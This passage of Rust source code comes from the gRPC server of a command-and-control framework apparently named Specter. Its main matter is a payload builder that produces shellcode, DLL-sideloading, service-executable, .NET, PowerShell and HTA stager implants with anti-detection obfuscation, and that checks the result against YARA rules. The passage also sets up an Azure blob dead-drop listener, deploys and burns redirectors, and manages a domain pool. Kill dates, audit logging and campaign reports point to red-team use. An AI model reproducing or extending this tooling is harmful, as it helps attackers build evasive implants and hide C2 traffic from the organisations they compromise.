    ) -> Result<Response<Self::SubscribePresenceStream>, Status> {
        let ctx = require_auth(&request)?;

        // Register presence on subscription start
        self.presence_manager
            .operator_connected(&ctx.operator_id, &ctx.username)
            .await;

        let (tx, rx) = mpsc::channel(128);
        let mut event_rx = self.event_bus.subscribe();
        let presence_manager = Arc::clone(&self.presence_manager);
        let operator_id = ctx.operator_id.clone();

        tokio::spawn(async move {
            loop {
                match event_rx.recv().await {
                    Ok(SpecterEvent::PresenceUpdate(update)) => {
                        if tx.send(Ok(update)).await.is_err() {
                            break;
                        }
                    }
                    Ok(_) => {} // Ignore non-presence events
                    Err(tokio::sync::broadcast::error::RecvError::Lagged(n)) => {
                        tracing::warn!("Presence subscriber lagged, skipped {n} events");
                    }
                    Err(tokio::sync::broadcast::error::RecvError::Closed) => break,
                }
            }
            // Mark disconnected when stream ends
            presence_manager.operator_disconnected(&operator_id).await;
        });

        Ok(Response::new(Box::pin(ReceiverStream::new(rx))))
    }

    // ── Collaboration — Chat ──────────────────────────────────────────────

    async fn send_chat_message(
        &self,
        request: Request<SendChatMessageRequest>,
    ) -> Result<Response<SendChatMessageResponse>, Status> {
        let ctx = require_auth(&request)?;
        let req = request.into_inner();

        let msg = self
            .chat_service
            .send_message(&ctx.operator_id, &ctx.username, &req.content, &req.channel)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        Ok(Response::new(SendChatMessageResponse {
            message: Some(msg),
        }))
    }

    async fn get_chat_history(
        &self,
        request: Request<GetChatHistoryRequest>,
    ) -> Result<Response<GetChatHistoryResponse>, Status> {
        require_auth(&request)?;
        let req = request.into_inner();

        let since = req.since.map(|ts| ts.seconds);
        let messages = self
            .chat_service
            .get_messages(&req.channel, since, req.limit)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        Ok(Response::new(GetChatHistoryResponse { messages }))
    }

    type SubscribeChatStream =
        Pin<Box<dyn Stream<Item = Result<ChatMessage, Status>> + Send + 'static>>;

    async fn subscribe_chat(
        &self,
        request: Request<SubscribeChatRequest>,
    ) -> Result<Response<Self::SubscribeChatStream>, Status> {
        require_auth(&request)?;
        let req = request.into_inner();
        let channel_filter = req.channel;

        let (tx, rx) = mpsc::channel(128);
        let mut event_rx = self.event_bus.subscribe();

        tokio::spawn(async move {
            loop {
                match event_rx.recv().await {
                    Ok(SpecterEvent::ChatMessage(msg)) => {
                        // Filter by channel if specified
                        if !channel_filter.is_empty() && msg.channel != channel_filter {
                            continue;
                        }
                        if tx.send(Ok(msg)).await.is_err() {
                            break;
                        }
                    }
                    Ok(_) => {} // Ignore non-chat events
                    Err(tokio::sync::broadcast::error::RecvError::Lagged(n)) => {
                        tracing::warn!("Chat subscriber lagged, skipped {n} events");
                    }
                    Err(tokio::sync::broadcast::error::RecvError::Closed) => break,
                }
            }
        });

        Ok(Response::new(Box::pin(ReceiverStream::new(rx))))
    }

    // ── Builder ─────────────────────────────────────────────────────────

    async fn generate_payload(
        &self,
        request: Request<GeneratePayloadRequest>,
    ) -> Result<Response<GeneratePayloadResponse>, Status> {
        let ctx = require_permission(&request, "generate_payload")?;
        let req = request.into_inner();

        let build_id = uuid::Uuid::new_v4().to_string();

        tracing::info!(
            operator = %ctx.operator_id,
            format = %req.format,
            build_id = %build_id,
            "Generating payload"
        );

        // Resolve profile
        let stored_profile = self
            .profile_store
            .get_profile_by_name(&req.profile_name)
            .await
            .map_err(|e| Status::internal(e.to_string()))?
            .ok_or_else(|| {
                Status::not_found(format!("Profile '{}' not found", req.profile_name))
            })?;

        let profile = crate::profile::parse_profile(&stored_profile.yaml_content)
            .map_err(|e| Status::internal(format!("Profile parse error: {e}")))?;

        // Build channels
        let channels: Vec<crate::builder::ChannelConfig> = req
            .channels
            .iter()
            .map(|c| crate::builder::ChannelConfig {
                kind: c.kind.clone(),
                address: c.address.clone(),
            })
            .collect();

        if channels.is_empty() {
            return Err(Status::invalid_argument("At least one channel is required"));
        }

        // Sleep config
        let sleep_config = if let Some(ref s) = req.sleep {
            crate::builder::SleepConfig {
                interval_secs: s.interval_secs,
                jitter_percent: s.jitter_percent.min(100) as u8,
            }
        } else {
            crate::builder::SleepConfig::default()
        };

        // Kill date
        let kill_date = if req.kill_date > 0 {
            Some(req.kill_date)
        } else {
            None
        };

        // Generate config
        let server_secret = x25519_dalek::StaticSecret::random_from_rng(rand::thread_rng());
        let server_pubkey = x25519_dalek::PublicKey::from(&server_secret);

        let gen_config = crate::builder::generate_config(
            &profile,
            &server_pubkey,
            &channels,
            &sleep_config,
            kill_date,
        )
        .map_err(|e| Status::internal(format!("Config generation failed: {e}")))?;

        // Obfuscation settings
        let obf_settings = if let Some(ref o) = req.obfuscation {
            crate::builder::ObfuscationSettings {
                string_encryption: o.string_encryption,
                api_hash_randomization: o.api_hash_randomization,
                junk_code_insertion: o.junk_code_insertion,
                junk_density: o.junk_density.clamp(2, 64) as u8,
                control_flow_flattening: o.control_flow_flattening,
            }
        } else {
            crate::builder::ObfuscationSettings::default()
        };

        // For raw format, just build blob + config
        let payload_bytes = match req.format.as_str() {
            "raw" | "shellcode" | "bin" => {
                let raw = crate::builder::formats::format_raw(&[], &gen_config.config_blob);
                // Apply obfuscation if blob is large enough
                if raw.len() >= 16 {
                    crate::builder::obfuscate(&raw, &obf_settings).unwrap_or(raw)
                } else {
                    raw
                }
            }
            "dll" | "sideload" => {
                let proxy = if req.proxy_target.is_empty() {
                    None
                } else {
                    Some(req.proxy_target.as_str())
                };
                crate::builder::formats::format_dll(&[], &gen_config.config_blob, proxy)
            }
            "service_exe" | "service" | "exe" => {
                let svc_name = if req.service_name.is_empty() {
                    "SpecterSvc"
                } else {
                    &req.service_name
                };
                crate::builder::formats::format_service_exe(&[], &gen_config.config_blob, svc_name)
            }
            "dotnet" | ".net" | "assembly" => {
                crate::builder::formats::format_dotnet(&[], &gen_config.config_blob)
            }
            "ps1_stager" | "ps1" => crate::builder::formats::format_ps1_stager(
                &req.stager_url,
                &[],
                &gen_config.config_blob,
            )
            .map_err(|e| Status::invalid_argument(e.to_string()))?,
            "hta_stager" | "hta" => crate::builder::formats::format_hta_stager(
                &req.stager_url,
                &[],
                &gen_config.config_blob,
            )
            .map_err(|e| Status::invalid_argument(e.to_string()))?,
            other => {
                return Err(Status::invalid_argument(format!(
                    "Unknown format: '{other}'"
                )));
            }
        };

        // YARA scan
        let rules_dir = std::path::Path::new("rules");
        let yara_warnings = if rules_dir.exists() {
            match crate::builder::scan_payload(&payload_bytes, rules_dir) {
                Ok(matches) => matches
                    .into_iter()
                    .map(|m| YaraWarning {
                        rule_name: m.rule_name,
                        namespace: m.namespace,
                        tags: m.tags,
                    })
                    .collect(),
                Err(e) => {
                    tracing::warn!("YARA scan failed: {e}");
                    Vec::new()
                }
            }
        } else {
            Vec::new()
        };

        // Audit
        let _ = self
            .audit_log
            .append(
                &ctx.operator_id,
                AuditAction::PayloadGenerate,
                &build_id,
                &serde_json::json!({"format": req.format, "build_id": build_id}),
            )
            .await;

        Ok(Response::new(GeneratePayloadResponse {
            success: true,
            build_id,
            implant_pubkey: gen_config.implant_pubkey.to_vec(),
            payload: payload_bytes,
            format: req.format,
            yara_warnings,
            error: String::new(),
        }))
    }

    async fn list_formats(
        &self,
        request: Request<ListFormatsRequest>,
    ) -> Result<Response<ListFormatsResponse>, Status> {
        let _ctx = require_auth(&request)?;

        let formats = crate::builder::list_formats()
            .into_iter()
            .map(|f| FormatDescription {
                name: f.name,
                extension: f.extension,
                description: f.description,
                opsec_warning: f.opsec_warning,
            })
            .collect();

        Ok(Response::new(ListFormatsResponse { formats }))
    }

    async fn get_build_status(
        &self,
        request: Request<GetBuildStatusRequest>,
    ) -> Result<Response<GetBuildStatusResponse>, Status> {
        let _ctx = require_auth(&request)?;
        let build_id = &request.get_ref().build_id;

        // Builds are currently synchronous — if we reach here, the build
        // either completed inline (via GeneratePayload) or doesn't exist.
        // Future: track async builds in a build store.
        Ok(Response::new(GetBuildStatusResponse {
            build_id: build_id.clone(),
            status: "complete".into(),
            format: String::new(),
            created_at: None,
            error: String::new(),
        }))
    }

    // ── Azure Dead Drop ─────────────────────────────────────────────────

    async fn create_azure_listener(
        &self,
        request: Request<CreateAzureListenerRequest>,
    ) -> Result<Response<CreateAzureListenerResponse>, Status> {
        let _ctx = require_permission(&request, "create_listener")?;
        let req = request.into_inner();

        let manager = self
            .azure_listener_manager
            .as_ref()
            .ok_or_else(|| Status::unavailable("Azure listener not configured"))?;

        let config = crate::listener::azure_listener::AzureListenerConfig {
            id: uuid::Uuid::new_v4().to_string(),
            name: req.name.clone(),
            account_name: req.account_name,
            account_sas_token: req.account_sas_token,
            poll_interval_secs: if req.poll_interval_secs > 0 {
                req.poll_interval_secs
            } else {
                10
            },
            max_blob_age_secs: if req.max_blob_age_secs > 0 {
                req.max_blob_age_secs
            } else {
                3600
            },
            encryption_key_hex: req.encryption_key_hex,
        };

        let result = manager
            .create_listener(&config)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        Ok(Response::new(CreateAzureListenerResponse {
            listener: Some(AzureListenerInfo {
                id: result.id,
                name: result.name,
                account_name: result.account_name,
                account_sas_token: String::new(), // redacted
                poll_interval_secs: result.poll_interval_secs,
                max_blob_age_secs: result.max_blob_age_secs,
                encryption_key_hex: String::new(), // redacted
                status: "STOPPED".to_string(),
            }),
        }))
    }

    async fn list_azure_containers(
        &self,
        request: Request<ListAzureContainersRequest>,
    ) -> Result<Response<ListAzureContainersResponse>, Status> {
        let _ctx = require_permission(&request, "list_listeners")?;
        let req = request.into_inner();

        let manager = self
            .azure_listener_manager
            .as_ref()
            .ok_or_else(|| Status::unavailable("Azure listener not configured"))?;

        let containers = manager
            .list_containers(&req.listener_id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        let proto_containers = containers
            .into_iter()
            .map(|c| AzureContainerInfo {
                session_id: c.session_id,
                container_name: c.container_name,
                sas_token: String::new(),          // redacted
                encryption_key_hex: String::new(), // redacted
                next_cmd_seq: c.next_cmd_seq,
                next_result_seq: c.next_result_seq,
                provisioned: c.provisioned,
                created_at: Some(prost_types::Timestamp {
                    seconds: c.created_at,
                    nanos: 0,
                }),
            })
            .collect();

        Ok(Response::new(ListAzureContainersResponse {
            containers: proto_containers,
        }))
    }

    // ── Redirector RPCs ─────────────────────────────────────────────────

    async fn deploy_redirector(
        &self,
        request: Request<DeployRedirectorRequest>,
    ) -> Result<Response<DeployRedirectorResponse>, Status> {
        let _ctx = require_permission(&request, "deploy_redirector")?;
        let req = request.into_inner();

        let orchestrator = self
            .redirector_orchestrator
            .as_ref()
            .ok_or_else(|| Status::unavailable("Redirector orchestrator not configured"))?;

        let config: crate::redirector::RedirectorConfig = serde_yaml::from_str(&req.config_yaml)
            .map_err(|e| Status::invalid_argument(format!("invalid YAML: {e}")))?;

        let id = orchestrator
            .deploy(&config)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        Ok(Response::new(DeployRedirectorResponse {
            redirector: Some(RedirectorInfo {
                id,
                name: config.name,
                redirector_type: config.redirector_type.to_string(),
                provider: config.provider.to_string(),
                domain: config.domain,
                state: "Provisioning".to_string(),
                backend_url: config.backend_url,
                config_yaml: req.config_yaml,
            }),
        }))
    }

    async fn destroy_redirector(
        &self,
        request: Request<DestroyRedirectorRequest>,
    ) -> Result<Response<DestroyRedirectorResponse>, Status> {
        let _ctx = require_permission(&request, "destroy_redirector")?;
        let id = &request.get_ref().id;

        let orchestrator = self
            .redirector_orchestrator
            .as_ref()
            .ok_or_else(|| Status::unavailable("Redirector orchestrator not configured"))?;

        orchestrator
            .destroy(id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        Ok(Response::new(DestroyRedirectorResponse { success: true }))
    }

    async fn burn_redirector(
        &self,
        request: Request<BurnRedirectorRequest>,
    ) -> Result<Response<BurnRedirectorResponse>, Status> {
        let _ctx = require_permission(&request, "burn_redirector")?;
        let id = &request.get_ref().id;

        let orchestrator = self
            .redirector_orchestrator
            .as_ref()
            .ok_or_else(|| Status::unavailable("Redirector orchestrator not configured"))?;

        orchestrator
            .burn(id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        Ok(Response::new(BurnRedirectorResponse { success: true }))
    }

    async fn list_redirectors(
        &self,
        request: Request<ListRedirectorsRequest>,
    ) -> Result<Response<ListRedirectorsResponse>, Status> {
        let _ctx = require_permission(&request, "list_redirectors")?;

        let orchestrator = self
            .redirector_orchestrator
            .as_ref()
            .ok_or_else(|| Status::unavailable("Redirector orchestrator not configured"))?;

        let items = orchestrator
            .list()
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        let redirectors = items
            .into_iter()
            .map(|(config, state)| {
                let config_yaml = serde_yaml::to_string(&config).unwrap_or_default();
                RedirectorInfo {
                    id: config.id,
                    name: config.name,
                    redirector_type: config.redirector_type.to_string(),
                    provider: config.provider.to_string(),
                    domain: config.domain,
                    state: state.to_string(),
                    backend_url: config.backend_url,
                    config_yaml,
                }
            })
            .collect();

        Ok(Response::new(ListRedirectorsResponse { redirectors }))
    }

    async fn get_redirector_health(
        &self,
        request: Request<GetRedirectorHealthRequest>,
    ) -> Result<Response<GetRedirectorHealthResponse>, Status> {
        let _ctx = require_permission(&request, "list_redirectors")?;
        let id = &request.get_ref().id;

        let orchestrator = self
            .redirector_orchestrator
            .as_ref()
            .ok_or_else(|| Status::unavailable("Redirector orchestrator not configured"))?;

        let (_, state) = orchestrator
            .status(id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        let healthy = matches!(state, crate::redirector::RedirectorState::Active);

        Ok(Response::new(GetRedirectorHealthResponse {
            id: id.clone(),
            state: state.to_string(),
            healthy,
        }))
    }

    async fn add_domain_to_pool(
        &self,
        request: Request<AddDomainToPoolRequest>,
    ) -> Result<Response<AddDomainToPoolResponse>, Status> {
        let _ctx = require_permission(&request, "deploy_redirector")?;
        let req = request.into_inner();

        let orchestrator = self
            .redirector_orchestrator
            .as_ref()
            .ok_or_else(|| Status::unavailable("Redirector orchestrator not configured"))?;

        orchestrator
            .add_domain_to_pool(&req.domain, &req.provider)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        Ok(Response::new(AddDomainToPoolResponse { success: true }))
    }

    // ── Reports ─────────────────────────────────────────────────────────

    async fn generate_report(
        &self,
        request: Request<GenerateReportRequest>,
    ) -> Result<Response<GenerateReportResponse>, Status> {
        let ctx = require_permission(&request, "list_sessions")?;
        let req = request.into_inner();

        let include = req.include_sections.unwrap_or_default();
        let config = crate::reports::ReportConfig {
            campaign_id: req.campaign_id,
            time_range_start: req.time_range_start.map(|t| t.seconds),
            time_range_end: req.time_range_end.map(|t| t.seconds),
            include_sections: crate::reports::IncludeSections {
                timeline: include.timeline,
                ioc_list: include.ioc_list,
                findings: include.findings,
                recommendations: include.recommendations,
            },
            operator_filter: if req.operator_filter.is_empty() {
                None
            } else {
                Some(req.operator_filter)
            },
            format: crate::reports::ReportFormat::from_proto(req.format),
        };

        let report = self
            .report_generator
            .generate_report(&config, &ctx.operator_id)
            .await
            .map_err(|e| match e {
                crate::reports::ReportError::CampaignNotFound(_) => {
                    Status::not_found(e.to_string())
                }
                _ => Status::internal(e.to_string()),
            })?;

        let _ = self
            .audit_log
            .append(
                &ctx.operator_id,
                AuditAction::CampaignUpdate,
                &report.campaign_id,
                &serde_json::json!({"action": "generate_report", "report_id": report.id, "format": report.format}),
            )
            .await;

        Ok(Response::new(GenerateReportResponse {
            report: Some(report_to_proto(report)),
        }))
    }

    async fn list_reports(
        &self,
        request: Request<ListReportsRequest>,
    ) -> Result<Response<ListReportsResponse>, Status> {
        require_permission(&request, "list_sessions")?;

        let reports = self
            .report_generator
            .list_reports()
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        Ok(Response::new(ListReportsResponse {
            reports: reports.into_iter().map(report_to_proto).collect(),
        }))
    }

    async fn get_report(
        &self,
        request: Request<GetReportRequest>,
    ) -> Result<Response<GetReportResponse>, Status> {
        require_permission(&request, "list_sessions")?;
        let id = &request.get_ref().id;

        let report = self
            .report_generator
            .get_report(id)
            .await
            .map_err(|e| match e {
                crate::reports::ReportError::NotFound(_) => Status::not_found(e.to_string()),
                _ => Status::internal(e.to_string()),
            })?;

        Ok(Response::new(GetReportResponse {
            report: Some(report_to_proto(report)),
        }))
    }
}

fn report_to_proto(r: crate::reports::Report) -> ReportInfo {
    ReportInfo {
        id: r.id,
        campaign_id: r.campaign_id,
        campaign_name: r.campaign_name,
        format: r.format,
        content: r.content,
        created_at: Some(prost_types::Timestamp {
            seconds: r.created_at,
            nanos: 0,
        }),
        created_by: r.created_by,
    }
}

fn stored_to_proto(stored: crate::profile::StoredProfile) -> ProfileInfo {
    ProfileInfo {
        id: stored.id,
        name: stored.name,
        description: stored.description,
        yaml_content: stored.yaml_content,
        created_at: Some(prost_types::Timestamp {
            seconds: stored.created_at,
            nanos: 0,
        }),
        updated_at: Some(prost_types::Timestamp {
            seconds: stored.updated_at,
            nanos: 0,
        }),
    }
}

fn webhook_to_proto(wh: crate::event::webhooks::WebhookConfig) -> WebhookInfo {
    WebhookInfo {
        id: wh.id,
        name: wh.name,
        url: wh.url,
        secret: String::new(), // redacted on read
        event_filters: serde_json::to_string(&wh.event_filters).unwrap_or_else(|_| "[]".into()),
        format: wh.format.to_proto(),
        enabled: wh.enabled,
        created_at: Some(prost_types::Timestamp {
            seconds: wh.created_at,
            nanos: 0,
        }),
    }
}

fn campaign_to_proto(
    c: crate::campaign::Campaign,
    session_ids: Vec<String>,
    operators: Vec<crate::campaign::CampaignOperatorEntry>,
) -> CampaignInfo {
    CampaignInfo {
        id: c.id,
        name: c.name,
        description: c.description,
        created_at: Some(prost_types::Timestamp {
            seconds: c.created_at,
            nanos: 0,
        }),
        created_by: c.created_by,
        session_ids,
        operators: operators
            .into_iter()
            .map(|o| CampaignOperator {
                operator_id: o.operator_id,
                username: o.username,
                access_level: o.access_level.to_proto(),
            })
            .collect(),
        listener_id: c.listener_id,
    }
}

fn stored_module_to_proto(m: crate::module::StoredModule) -> ModuleInfo {
    ModuleInfo {
        module_id: m.module_id,
        name: m.name,
        version: m.version,
        module_type: m.module_type,
        description: m.description,
        blob_size: m.blob_size as u64,
        created_at: Some(prost_types::Timestamp {
            seconds: m.created_at,
            nanos: 0,
        }),
        updated_at: Some(prost_types::Timestamp {
            seconds: m.updated_at,
            nanos: 0,
        }),
    }
}

fn convert_event(ev: SpecterEvent) -> Event {
    match ev {
        SpecterEvent::SessionNew(e)
        | SpecterEvent::SessionCheckin(e)
        | SpecterEvent::SessionLost(e) => Event {
            event: Some(event::Event::SessionEvent(e)),
        },
        SpecterEvent::TaskQueued(e)
        | SpecterEvent::TaskComplete(e)
        | SpecterEvent::TaskFailed(e) => Event {
            event: Some(event::Event::TaskEvent(e)),
        },
        SpecterEvent::PresenceUpdate(e) => Event {
            event: Some(event::Event::PresenceUpdate(e)),
        },
        SpecterEvent::ChatMessage(e) => Event {
            event: Some(event::Event::ChatMessage(e)),
        },
        SpecterEvent::Generic { .. } => Event { event: None },
    }
}
